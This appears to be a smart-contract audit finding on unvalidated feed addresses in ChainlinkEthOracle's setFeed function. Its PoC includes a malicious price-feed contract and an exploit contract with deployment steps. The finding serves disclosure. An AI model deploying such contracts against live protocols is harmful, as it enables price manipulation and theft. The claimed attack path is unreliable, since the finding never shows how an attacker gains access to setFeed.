Polished White Coyote

High

# Untrusted Feed Address at setFeed function for ChainlinkEthOracle contract

### Summary

Link: https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/oracle/ChainlinkEthOracle.sol#L79C14-L79C21

In the setFeed function, the contract assumes that the provided feed address is valid and correctly implements the IAggegregatorV3 interface. If a malicious or incorrect address is provided, it could lead to unexpected behavior or vulnerabilities.

### Root Cause

Not validating external contract

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

By setting the malicious feed, the ChainlinkEthOracle will now use the malicious price data provided by the feed. This could lead to incorrect pricing, which might be exploited for various purposes depending on how the oracle data is used in your system.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAggegregatorV3 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);

    function decimals() external view returns (uint256);
}

contract MaliciousChainlinkFeed is IAggegregatorV3 {
    int256 public maliciousPrice;
    uint256 public timestamp;

    constructor(int256 _maliciousPrice) {
        maliciousPrice = _maliciousPrice;
        timestamp = block.timestamp;
    }

    function latestRoundData()
        external
        view
        override
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        return (0, maliciousPrice, timestamp, timestamp, 0);
    }

    function decimals() external pure override returns (uint256) {
        return 18; // Must return 18 decimals as per contract requirements
    }

    // Function to update malicious price (for testing purposes)
    function setMaliciousPrice(int256 _maliciousPrice) external {
        maliciousPrice = _maliciousPrice;
    }
}
```
**Exploit Script**
This script sets the malicious feed contract for an asset and then queries the ChainlinkEthOracle to demonstrate the effect of the exploit.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract Exploit {
    address public oracleAddress;
    address public maliciousFeedAddress;
    address public owner;

    constructor(address _oracleAddress, address _maliciousFeedAddress) {
        oracleAddress = _oracleAddress;
        maliciousFeedAddress = _maliciousFeedAddress;
        owner = msg.sender;
    }

    function exploit(address asset, uint256 stalePriceThreshold) external {
        // Interact with the ChainlinkEthOracle to set the malicious feed
        (bool success, ) = oracleAddress.call(
            abi.encodeWithSignature(
                "setFeed(address,address,uint256)",
                asset,
                maliciousFeedAddress,
                stalePriceThreshold
            )
        );
        require(success, "Failed to set feed");
        
        // Now the oracle contract uses the malicious feed
    }

    function updateMaliciousPrice(int256 newPrice) external {
        require(msg.sender == owner, "Only owner can update price");
        
        // Update the price in the malicious feed contract
        (bool success, ) = maliciousFeedAddress.call(
            abi.encodeWithSignature("setMaliciousPrice(int256)", newPrice)
        );
        require(success, "Failed to update malicious price");
    }
}
```
**Exploit Execution**
Deploy the MaliciousChainlinkFeed Contract: Deploy the malicious feed contract with an arbitrary price.
Deploy the Exploit Contract: Provide addresses for the ChainlinkEthOracle and the malicious feed contract.
Execute the exploit Function: Call the exploit function with the asset address and a stale price threshold. This will set the malicious feed for the asset in the ChainlinkEthOracle.
Update Malicious Price: Optionally, update the malicious price in the malicious feed contract using the updateMaliciousPrice function.

### Mitigation

Feed Address Validation: Ensure that the provided feed address is validated before being set.
Audit and Review: Regularly audit and review the implementation of oracles and ensure that they interact correctly with external feeds.